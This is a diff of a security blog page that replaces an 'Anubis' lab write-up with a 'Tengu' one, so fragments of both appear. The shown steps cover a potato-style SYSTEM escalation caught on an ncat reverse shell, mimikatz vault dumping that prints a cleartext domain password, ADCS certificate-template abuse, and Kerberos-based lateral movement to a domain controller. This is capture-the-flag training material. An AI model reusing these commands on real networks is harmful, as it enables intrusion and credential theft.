+  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery
+  PrintSpoofer discovery and original exploit by @itm4n
+  EfsRpc built on EfsPotato by @zcgonvh and PetitPotam by @topotam
+[+] Attempting NP impersonation using method PrintSpoofer to launch C:\windows\tasks\shell.exe
+[+] Triggering notification on evil PIPE \\SQL/pipe/6c76cb7f-5149-4dbd-9b88-e9230608afa5
+[+] Server connected to our evil RPC pipe
+[+] Duplicated impersonation token ready for process creation
+[+] Intercepted and authenticated successfully, launching program
+[+] Process created, enjoy!
+
+
+ncat -lvnp 9001
+Ncat: Version 7.95 ( https://nmap.org/ncat )
+Ncat: Listening on [::]:9001
+Ncat: Listening on 0.0.0.0:9001
+Ncat: Connection from 10.10.180.38:56246.
+Microsoft Windows [Version 10.0.20348.2340]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami
+whoami
+nt authority\system</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="domain-admin">
     <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#esc4">#</doc-anchor-trigger>
-        <span>ESC4</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#domain-admin">#</doc-anchor-trigger>
+        <span>Domain Admin</span>
     </h1>
 </doc-anchor-target>
-<p>As we are now a member of the webdevelopers group we can modify the template to allow for user auth. For this I&#x27;m going to use this script: <a href="https://github.com/cfalta/PoshADCS/blob/master/ADCS.ps1">https://github.com/cfalta/PoshADCS/blob/master/ADCS.ps1</a> which converts a template into the format needed to request a smartcard cert (pfx).</p>
+<p>Time to dump everything with mimikatz:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">[&gt;] Get-SmartcardCertificate -Identity diegocruz -TemplateName Web</code></pre>
+<pre class="language-none"><code v-pre class="language-none">.\mk.exe &quot;vault::cred /patch&quot; &quot;exit&quot;
+.\mk.exe &quot;vault::cred /patch&quot; &quot;exit&quot;
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  &quot;A La Vie, A L'Amour&quot; - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # vault::cred /patch
+TargetName : Domain:batch=TaskScheduler:Task:{3C0BC8C6-D88D-450C-803D-6A412D858CF2} / &lt;NULL&gt;
+UserName   : TENGU\T0_c.fowler
+Comment    : &lt;NULL&gt;
+Type       : 2 - domain_password
+Persist    : 2 - local_machine
+Flags      : 00004004
+Credential : UntrimmedDisplaceModify25
+Attributes : 0</code></pre>
 </doc-codeblock></div>
-<p>We can check this worked by running certify on the box:</p>
+<p>winrm into the dc:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">.\certify.exe find /vulnerable /currentuser
-&lt;snip&gt;
-    CA Name                               : earth.windcorp.htb\windcorp-CA
-    Template Name                         : Web
-    Schema Version                        : 2
-    Validity Period                       : 10 years
-    Renewal Period                        : 6 weeks
-    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
-    mspki-enrollment-flag                 : NONE
-    Authorized Signatures Required        : 0
-    pkiextendedkeyusage                   : Server Authentication
-    mspki-certificate-application-policy  : Client Authentication
-    Permissions
-      Enrollment Permissions
-        Enrollment Rights           : WINDCORP\Domain Admins        S-1-5-21-3510634497-171945951-3071966075-512
-                                      WINDCORP\Enterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519
-        All Extended Rights         : WINDCORP\webdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290
-&lt;snip&gt;</code></pre>
+<pre class="language-none"><code v-pre class="language-none">proxychains wmiexec.py t0_c.fowler:UntrimmedDisplaceModify25@dc.tengu.vl
+Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
+
+[-] SMB SessionError: code: 0xc000006e - STATUS_ACCOUNT_RESTRICTION - Indicates a referenced user name and authentication information are valid, but some user account restriction has prevented successful authentication (such as time-of-day restrictions).</code></pre>
 </doc-codeblock></div>
-<p>Final step is to request the cert, get a tgt then psexec in:</p>
+<p>This just means we have to use kerberos auth:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">[&gt;] .\certify.exe request /ca:earth.windcorp.htb\windcorp-CA /template:Web /altname:administrator
-$ openssl pkcs12 -in cert.pem -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfx
-$ proxychains python3 /opt/PKINITtools/gettgtpkinit.py -dc-ip 10.10.11.102 -cert-pfx cert.pfx windcorp.htb/administrator admin.ccache
-$ KRB5CCNAME=$(pwd)/admin.ccache proxychains -q psexec.py administrator@earth.windcorp.htb -k -no-pass -dc-ip 10.10.11.102</code></pre>
+<pre class="language-none"><code v-pre class="language-none">proxychains getTGT.py tengu.vl/t0_c.fowler:UntrimmedDisplaceModify25
+Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in t0_c.fowler.ccache
+
+KRB5CCNAME=$(pwd)/t0_c.fowler.ccache proxychains wmiexec.py t0_c.fowler@dc.tengu.vl -k -no-pass
+Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\&gt;hostname
+DC</code></pre>
 </doc-codeblock></div>
-<p>root.txt:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">be33a363f06fa7cbd99a2e3bc0793151</code></pre>
-</doc-codeblock></div>
-<doc-anchor-target id="things-to-learn--look-into">
-    <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#things-to-learn--look-into">#</doc-anchor-trigger>
-        <span>Things to learn / look into</span>
-    </h1>
-</doc-anchor-target>
-<p>How to request a cert for the current user on windows, this means I wouldnt have to drop certify on the box to request the cert.</p>
-<p>VBS revshell - instead of calling out to a ps1 file and executing it with <code v-pre>CreateObject(&quot;WScript.Shell&quot;).exec()</code>. This would also give me greater control over the process running my revshell.</p>
-<p>I&#x27;m probs going to do the box again soonish with the above stuff included as it would make it more fun and challenging.</p>
 
                                 
                                 <!-- Required only on API pages -->
@@ -506,20 +452,20 @@ $ KRB5CCNAME=$(pwd)/admin.ccache proxychains -q psexec.py administrator@earth.wi
                             
                                 <nav class="flex mt-14">
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../research/linux_kerb_tickets/">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../writeups/vulnlab/reflection/">
                                             <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                             <span>
                                                 <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
-                                                <span class="block mt-1">Making Linux Kerberos Tickets Not Bad</span>
+                                                <span class="block mt-1">Reflection</span>
                                             </span>
                                         </a>
                                     </div>
                             
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../writeups/vulnlab/heron/">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../writeups/vulnlab/trusted/">
                                             <span>
                                                 <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
-                                                <span class="block mt-1">Heron</span>
+                                                <span class="block mt-1">Trusted</span>
                                             </span>
                                             <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                         </a>
@@ -563,6 +509,6 @@ $ KRB5CCNAME=$(pwd)/admin.ccache proxychains -q psexec.py administrator@earth.wi
 
     <div id="docs-overlay-target"></div>
 
-    <script data-cfasync="false">window.__DOCS__ = { "title": "Anubis", level: 3, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
+    <script data-cfasync="false">window.__DOCS__ = { "title": "Tengu", level: 3, icon: "file", hasPrism: false, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
 </body>
 </html>
